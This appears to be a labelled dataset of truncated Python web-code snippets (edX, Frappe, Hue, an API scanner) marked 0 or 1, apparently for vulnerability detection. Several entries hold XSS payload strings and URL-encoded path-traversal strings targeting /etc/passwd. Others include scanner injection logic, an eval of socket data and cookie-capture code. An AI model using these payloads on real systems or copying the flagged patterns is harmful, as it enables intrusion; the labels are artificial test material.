self).__enter__() def get_test_course(self): \"\"\" Fetches", "label": 0}, {"snippet_id": 18336, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 1583, "code": "/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']", "label": 0}, {"snippet_id": 5541, "code": ">', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> ", "label": 0}, {"snippet_id": 44561, "code": "=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name,", "label": 0}, {"snippet_id": 45203, "code": ") return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows)", "label": 1}, {"snippet_id": 46632, "code": "=super().get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get", "label": 0}, {"snippet_id": 4096, "code": " impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": ", "label": 0}, {"snippet_id": 16412, "code": "(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico", "label": 0}, {"snippet_id": 44336, "code": ".mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json", "label": 1}, {"snippet_id": 15865, "code": " self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?", "label": 0}, {"snippet_id": 46742, "code": "/benefit_detail.html' def get_context_data(self, *args, **kwargs): data=super().get_context_data(*args, **kwargs) if self.request.GET.get('back', None) is not None: data['back_link']=self.request.GET['back'] return", "label": 1}, {"snippet_id": 48046, "code": "\") def handle_file(u: Profile, headline: str, category: str, text: str, file): m: Media=Media() upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_'", "label": 0}, {"snippet_id": 47744, "code": "('/admin/users/edit?fault=' +str(reason)) def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely", "label": 0}, {"snippet_id": 50952, "code": " from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm from django_celery_beat.models import CrontabSchedule, PeriodicTask from import_export import resources from import_export.admin", "label": 0}, {"snippet_id": 4664, "code": " 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror", "label": 0}, {"snippet_id": 24671, "code": " ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test", "label": 0}, {"snippet_id": 23209, "code": "+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 26376, "code": ".vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result", "label": 0}, {"snippet_id": 16898, "code": "<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name", "label": 0}, {"snippet_id": 34382, "code": "[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not", "label": 0}, {"snippet_id": 49808, "code": ",function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ", "label": 1}, {"snippet_id": 40180, "code": "(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get", "label": 0}, {"snippet_id": 36471, "code": "\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters", "label": 0}, {"snippet_id": 3529, "code": " result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url", "label": 0}, {"snippet_id": 526, "code": " import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with", "label": 0}, {"snippet_id": 25488, "code": " ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value))", "label": 0}, {"snippet_id": 2094, "code": " Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result", "label": 0}, {"snippet_id": 16505, "code": " 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/", "label": 0}, {"snippet_id": 24208, "code": "{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports", "label": 0}, {"snippet_id": 1639, "code": " if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print", "label": 0}, {"snippet_id": 48551, "code": "=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation", "label": 0}, {"snippet_id": 11190, "code": " aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE", "label": 0}, {"snippet_id": 40651, "code": "\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t", "label": 0}, {"snippet_id": 35446, "code": "\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t", "label": 0}, {"snippet_id": 46344, "code": "'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request", "label": 0}, {"snippet_id": 18698, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax", "label": 0}, {"snippet_id": 42756, "code": "\t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict", "label": 0}, {"snippet_id": 52807, "code": " initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako',", "label": 0}, {"snippet_id": 19618, "code": ".join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls", "label": 0}, {"snippet_id": 48950, "code": " field else: display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function else field return escape(value) def format(self, value): if", "label": 1}, {"snippet_id": 22109, "code": "(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views", "label": 0}, {"snippet_id": 54406, "code": "=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4) Button(main, text='Stop', command=kill).grid(row=11, column", "label": 0}, {"snippet_id": 711, "code": " xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url", "label": 1}, {"snippet_id": 10776, "code": "'testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get(", "label": 0}, {"snippet_id": 35931, "code": " value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text", "label": 0}, {"snippet_id": 22589, "code": " notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/", "label": 0}, {"snippet_id": 44616, "code": "({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc", "label": 0}, {"snippet_id": 20078, "code": ": msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes", "label": 0}, {"snippet_id": 15208, "code": " to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping", "label": 0}, {"snippet_id": 4832, "code": "<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", ", "label": 0}, {"snippet_id": 13053, "code": "'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$',", "label": 0}, {"snippet_id": 39855, "code": " values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname ", "label": 0}, {"snippet_id": 23603, "code": "'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 43487, "code": "=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname,", "label": 0}, {"snippet_id": 1056, "code": " xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\"", "label": 1}, {"snippet_id": 13787, "code": "/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware", "label": 1}, {"snippet_id": 5657, "code": "', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script", "label": 0}, {"snippet_id": 6341, "code": " with SAML related parameters. \"\"\" return self.config.get(self.section, 'pysaml2_config') @property def fticks_secret_key(self): \"\"\" SAML F-TICKS user anonymization key. If this is set, the IdP will log", "label": 0}, {"snippet_id": 20235, "code": " loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session", "label": 0}, {"snippet_id": 8839, "code": " name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in", "label": 0}, {"snippet_id": 20577, "code": "-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\",", "label": 0}, {"snippet_id": 38705, "code": " filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue", "label": 0}, {"snippet_id": 19300, "code": "') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid')", "label": 0}, {"snippet_id": 4070, "code": "\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers", "label": 0}, {"snippet_id": 13048, "code": ", name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views", "label": 0}, {"snippet_id": 44015, "code": "\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak", "label": 0}, {"snippet_id": 14764, "code": "'tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss", "label": 0}, {"snippet_id": 24334, "code": "(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning", "label": 0}, {"snippet_id": 44012, "code": ", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd", "label": 0}, {"snippet_id": 52980, "code": ".user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the", "label": 0}, {"snippet_id": 10533, "code": ".get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir", "label": 0}, {"snippet_id": 5897, "code": " def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>'", "label": 0}, {"snippet_id": 14006, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 36343, "code": " True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in", "label": 0}, {"snippet_id": 44629, "code": " response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request):", "label": 0}, {"snippet_id": 32317, "code": ": path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath", "label": 0}, {"snippet_id": 27872, "code": "'message': exception.message, 'traceDump': traceback.format_exc()} logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content", "label": 0}, {"snippet_id": 24937, "code": "(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs", "label": 0}, {"snippet_id": 28029, "code": "\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except auth", "label": 0}, {"snippet_id": 53942, "code": "'cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn", "label": 0}, {"snippet_id": 24211, "code": "}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite", "label": 0}, {"snippet_id": 7917, "code": "/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',", "label": 0}, {"snippet_id": 40142, "code": "}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit", "label": 0}, {"snippet_id": 8905, "code": "),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views", "label": 0}, {"snippet_id": 33729, "code": "( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe", "label": 1}, {"snippet_id": 36110, "code": ":param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield", "label": 0}, {"snippet_id": 796, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key", "label": 0}, {"snippet_id": 26504, "code": "%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 503, "code": "\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid)", "label": 1}, {"snippet_id": 32814, "code": "(self, template): self._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html", "label": 0}, {"snippet_id": 41912, "code": "=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif", "label": 0}, {"snippet_id": 32940, "code": "\">%s/</a><br/>\\n' % (self.path.rstrip('/'), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path", "label": 1}, {"snippet_id": 15364, "code": " '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots", "label": 0}, {"snippet_id": 20959, "code": "(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), ", "label": 0}, {"snippet_id": 44455, "code": " doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4(", "label": 0}, {"snippet_id": 38207, "code": " Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull", "label": 0}, {"snippet_id": 38978, "code": "'__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname)", "label": 0}, {"snippet_id": 24925, "code": " return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self", "label": 0}, {"snippet_id": 46047, "code": "(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard", "label": 0}, {"snippet_id": 15349, "code": " DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '')", "label": 1}, {"snippet_id": 1309, "code": "(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body'", "label": 0}, {"snippet_id": 17453, "code": ", url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log", "label": 0}, {"snippet_id": 2838, "code": ") !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url", "label": 0}, {"snippet_id": 17199, "code": "'ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',", "label": 0}, {"snippet_id": 12845, "code": "/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views", "label": 0}, {"snippet_id": 8836, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$',", "label": 0}, {"snippet_id": 52167, "code": "(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request)", "label": 1}, {"snippet_id": 35559, "code": ": \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options", "label": 0}, {"snippet_id": 7357, "code": "'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki", "label": 0}, {"snippet_id": 21536, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 6035, "code": "'logdir': None, 'logfile': None, 'syslog_socket': None, 'listen_addr': '0.0.0.0', 'listen_port': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID", "label": 0}, {"snippet_id": 12392, "code": "+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading", "label": 0}, {"snippet_id": 53047, "code": ": -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects", "label": 0}, {"snippet_id": 32973, "code": " def _Read(self, relpath, relative_to=None): if relative_to is None: relative_to=self.server.top_level assert not relpath.startswith(os.sep) path=os.path.join(relative_to, relpath) with codecs.open(path", "label": 0}, {"snippet_id": 15700, "code": " interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try", "label": 0}, {"snippet_id": 34380, "code": "=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) ", "label": 0}, {"snippet_id": 15977, "code": "): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"", "label": 0}, {"snippet_id": 42855, "code": ": \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df", "label": 0}, {"snippet_id": 1904, "code": ", temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, ", "label": 1}, {"snippet_id": 34593, "code": "[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype 